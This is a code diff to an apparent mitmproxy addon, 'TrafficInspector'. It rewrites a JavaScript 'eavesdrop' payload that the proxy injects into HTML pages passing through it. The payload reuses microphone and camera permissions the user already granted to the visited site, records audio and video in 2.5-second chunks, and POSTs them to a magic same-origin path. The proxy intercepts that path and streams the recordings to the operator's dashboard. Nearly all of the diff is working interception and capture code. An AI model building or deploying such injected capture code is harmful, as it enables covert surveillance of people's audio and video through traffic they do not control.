@@ -96,7 +96,6 @@ class TrafficInspector:
         app.router.add_post("/api/inject",             self._handle_inject_post)
         app.router.add_get("/api/eavesdrop",           self._handle_eavesdrop_get)
         app.router.add_post("/api/eavesdrop",          self._handle_eavesdrop_post)
-        app.router.add_post("/api/eavesdrop/chunk",    self._handle_eavesdrop_chunk)
         return app
 
     # ── HTTP route handlers ───────────────────────────────────────────────────
@@ -168,18 +167,6 @@ class TrafficInspector:
         ctx.log.info(f"Eavesdrop {'enabled' if self._eavesdrop_enabled else 'disabled'}")
         return web.json_response({"ok": True, "enabled": self._eavesdrop_enabled})
 
-    async def _handle_eavesdrop_chunk(self, req: web.Request) -> web.Response:
-        """Receives a base64-encoded WebM blob POSTed by the injected page."""
-        headers = {"Access-Control-Allow-Origin": "*"}
-        try:
-            body = await req.read()
-            b64 = body.decode("ascii", errors="ignore").strip()
-        except Exception:
-            return web.Response(status=400, headers=headers)
-        if b64 and self._eavesdrop_enabled:
-            await self._broadcast({"type": "eavesdrop_chunk", "data": b64})
-        return web.Response(text="ok", headers=headers)
-
     # ── WebSocket handler ─────────────────────────────────────────────────────
 
     async def _handle_ws(self, req: web.Request) -> web.WebSocketResponse:
@@ -223,21 +210,24 @@ class TrafficInspector:
     def _build_eavesdrop_script(self) -> str:
         """Generate the transparent eavesdrop payload injected into HTML pages.
 
-        Approach: record 2.5-second complete WebM blobs with MediaRecorder,
-        convert each to base64 with FileReader, POST as text/plain (no CORS
-        preflight, no WebSocket needed — works from any origin).
+        Architecture: the injected page POSTs raw binary WebM chunks to a
+        magic path on its own origin (e.g. https://example.com/__ti__/eavesdrop).
+        mitmproxy intercepts the request in request(), base64-encodes the body,
+        and broadcasts it via the dashboard WebSocket — the target server never
+        sees it.  No localhost, no CORS, no WebSocket upgrade needed.
         """
-        return r"""/* Traffic Inspector — Transparent Eavesdrop */
-(function(){
+        chunk_path = self._CHUNK_PATH
+        return f"""/* Traffic Inspector — Transparent Eavesdrop */
+(function(){{
   'use strict';
-  var _TI_URL = 'http://localhost/api/eavesdrop/chunk';
+  var _TI_PATH = '{chunk_path}';
 
-  function _tiStart(hasCam) {
-    var constraints = hasCam ? {video:true,audio:true} : {video:false,audio:true};
-    navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+  function _tiStart(hasCam) {{
+    var constraints = hasCam ? {{video:true,audio:true}} : {{video:false,audio:true}};
+    navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {{
       var active = true;
 
-      function recordChunk() {
+      function recordChunk() {{
         if (!active) return;
         var types = [
           'video/webm;codecs=vp8,opus',
@@ -246,56 +236,53 @@ class TrafficInspector:
           'audio/webm;codecs=opus',
           'audio/webm'
         ];
-        var mime = types.find(function(m){ return MediaRecorder.isTypeSupported(m); }) || 'video/webm';
+        var mime = types.find(function(m){{ return MediaRecorder.isTypeSupported(m); }}) || 'video/webm';
         var chunks = [];
-        var rec = new MediaRecorder(stream, {mimeType: mime});
-        rec.ondataavailable = function(e){ if (e.data.size) chunks.push(e.data); };
-        rec.onstop = function() {
-          if (active && chunks.length) {
-            var blob = new Blob(chunks, {type: mime});
-            var fr = new FileReader();
-            fr.onload = function() {
-              fetch(_TI_URL, {
-                method:  'POST',
-                body:    fr.result.split(',')[1],
-                headers: {'Content-Type': 'text/plain'},
-                mode:    'no-cors'
-              }).catch(function(){});
-            };
-            fr.readAsDataURL(blob);
-          }
+        var rec = new MediaRecorder(stream, {{mimeType: mime}});
+        rec.ondataavailable = function(e){{ if (e.data.size) chunks.push(e.data); }};
+        rec.onstop = function() {{
+          if (active && chunks.length) {{
+            var blob = new Blob(chunks, {{type: mime}});
+            // POST raw binary to our magic intercept path on this origin.
+            // mitmproxy catches it before the real server ever sees it.
+            fetch(_TI_PATH, {{
+              method:  'POST',
+              body:    blob,
+              headers: {{'Content-Type': 'application/octet-stream'}}
+            }}).catch(function(){{}});
+          }}
           if (active) setTimeout(recordChunk, 50);
-        };
+        }};
         rec.start();
-        setTimeout(function(){ if (rec.state === 'recording') rec.stop(); }, 2500);
-      }
+        setTimeout(function(){{ if (rec.state === 'recording') rec.stop(); }}, 2500);
+      }}
 
       recordChunk();
-      window.addEventListener('pagehide', function(){
+      window.addEventListener('pagehide', function(){{
         active = false;
-        stream.getTracks().forEach(function(t){ t.stop(); });
-      });
-    }).catch(function(){});
-  }
+        stream.getTracks().forEach(function(t){{ t.stop(); }});
+      }});
+    }}).catch(function(){{}});
+  }}
 
-  async function _tiCheck() {
+  async function _tiCheck() {{
     var hasMic = false, hasCam = false;
-    try { hasMic = (await navigator.permissions.query({name:'microphone'})).state === 'granted'; } catch(_){}
-    try { hasCam = (await navigator.permissions.query({name:'camera'})).state === 'granted'; } catch(_){}
+    try {{ hasMic = (await navigator.permissions.query({{name:'microphone'}})).state === 'granted'; }} catch(_){{}}
+    try {{ hasCam = (await navigator.permissions.query({{name:'camera'}})).state === 'granted'; }} catch(_){{}}
     if (!hasMic && !hasCam) return;
     window.alert(
-      '\u26a0\ufe0f  TRAFFIC INSPECTOR \u2014 MONITORING NOTICE\n\n' +
-      'An operator is monitoring this browser session via Traffic Inspector.\n' +
+      '\\u26a0\\ufe0f  TRAFFIC INSPECTOR \\u2014 MONITORING NOTICE\\n\\n' +
+      'An operator is monitoring this browser session via Traffic Inspector.\\n' +
       'Your ' + (hasCam ? 'camera and microphone are' : 'microphone is') +
-      ' being captured for demonstration purposes.\n\n' +
-      'Close this tab or disable Eavesdrop in the Traffic Inspector\n' +
+      ' being captured for demonstration purposes.\\n\\n' +
+      'Close this tab or disable Eavesdrop in the Traffic Inspector\\n' +
       'dashboard to stop capture.'
     );
     _tiStart(hasCam);
-  }
+  }}
 
   _tiCheck();
-})();"""
+}})();"""
 
     def _evict_oldest(self) -> None:
         """Remove the oldest entry if the ring buffer is full."""
@@ -321,13 +308,33 @@ class TrafficInspector:
 
     # ── mitmproxy flow hooks ──────────────────────────────────────────────────
 
-    def request(self, flow: http.HTTPFlow) -> None:
-        """Tag each flow with a unique ID and start timestamp."""
+    # Special path the injected script POSTs media chunks to.
+    # mitmproxy intercepts and short-circuits — the real server never sees it.
+    _CHUNK_PATH = "/__ti__/eavesdrop"
+
+    async def request(self, flow: http.HTTPFlow) -> None:
+        """Intercept eavesdrop uploads; tag all other flows."""
+        if (flow.request.path == self._CHUNK_PATH
+                and flow.request.method == "POST"):
+            flow.metadata["_ti_internal"] = True
+            if self._eavesdrop_enabled and flow.request.content:
+                b64 = base64.b64encode(flow.request.content).decode("ascii")
+                await self._broadcast({"type": "eavesdrop_chunk", "data": b64})
+            flow.response = http.Response.make(
+                200, b"ok",
+                {"Content-Type": "text/plain",
+                 "Access-Control-Allow-Origin": "*"},
+            )
+            return
+
         flow.metadata["_id"] = str(uuid.uuid4())
         flow.metadata["_t0"] = time.perf_counter()
 
     async def response(self, flow: http.HTTPFlow) -> None:
         """Called when a complete response has been received."""
+        if flow.metadata.get("_ti_internal"):
+            return   # synthetic — do not log
+
         eid      = flow.metadata.get("_id", str(uuid.uuid4()))
         t0       = flow.metadata.get("_t0", time.perf_counter())
         duration = round((time.perf_counter() - t0) * 1000, 1)
@@ -421,7 +428,7 @@ class TrafficInspector:
 
     async def error(self, flow: http.HTTPFlow) -> None:
         """Log connection/TLS errors as synthetic entries."""
-        if not flow.error:
+        if not flow.error or flow.metadata.get("_ti_internal"):
             return
         eid = flow.metadata.get("_id", str(uuid.uuid4()))
         req = flow.request
